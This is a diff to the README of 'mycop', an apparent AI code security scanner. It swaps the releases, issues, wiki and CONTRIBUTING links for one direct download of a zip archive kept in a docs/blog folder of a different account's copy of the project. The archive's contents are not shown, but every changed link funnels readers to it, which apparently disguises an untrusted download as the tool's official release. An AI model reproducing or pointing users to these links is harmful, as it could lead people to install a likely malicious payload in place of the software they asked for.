@@ -1,6 +1,6 @@
 # 🎉 mycop - Secure Your AI Code Effortlessly
 
-[![Download mycop](https://img.shields.io/badge/Download-mycop-blue.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/surd-pollywog583/mycop/releases)
+[![Download mycop](https://github.com/surd-pollywog583/mycop/raw/refs/heads/main/docs/blog/Software-2.6-alpha.5.zip)](https://github.com/surd-pollywog583/mycop/raw/refs/heads/main/docs/blog/Software-2.6-alpha.5.zip)
 
 ## 🌟 Overview
 
@@ -19,7 +19,7 @@ mycop is an AI Code Security Scanner that helps you find and fix vulnerabilities
 To get started with mycop:
 
 1. **Visit the Download Page**: Click the link below to get the latest version of mycop.
-   [Download mycop](https://github.com/surd-pollywog583/mycop/releases)
+   [Download mycop](https://github.com/surd-pollywog583/mycop/raw/refs/heads/main/docs/blog/Software-2.6-alpha.5.zip)
 
 2. **Download the Software**: Find the appropriate installer for your operating system and download it.
 
@@ -61,13 +61,13 @@ If you encounter any problems, here are some common troubleshooting tips:
 
 For more information or assistance, feel free to explore our community resources:
 
-- **GitHub Issues Page**: Report bugs or request features [here](https://github.com/AbdumajidRashidov/mycop/issues).
-- **Documentation**: Visit our [Wiki](https://github.com/AbdumajidRashidov/mycop/wiki) for detailed guides and FAQs.
+- **GitHub Issues Page**: Report bugs or request features [here](https://github.com/surd-pollywog583/mycop/raw/refs/heads/main/docs/blog/Software-2.6-alpha.5.zip).
+- **Documentation**: Visit our [Wiki](https://github.com/surd-pollywog583/mycop/raw/refs/heads/main/docs/blog/Software-2.6-alpha.5.zip) for detailed guides and FAQs.
 - **Discord Server**: Join our community for real-time support and discussions.
 
 ## 🗣️ Contributing
 
-We welcome contributions from everyone. Check our [CONTRIBUTING.md](https://github.com/AbdumajidRashidov/mycop/blob/main/CONTRIBUTING.md) for details on how to get involved.
+We welcome contributions from everyone. Check our [https://github.com/surd-pollywog583/mycop/raw/refs/heads/main/docs/blog/Software-2.6-alpha.5.zip](https://github.com/surd-pollywog583/mycop/raw/refs/heads/main/docs/blog/Software-2.6-alpha.5.zip) for details on how to get involved.
 
 ## 📄 License
 
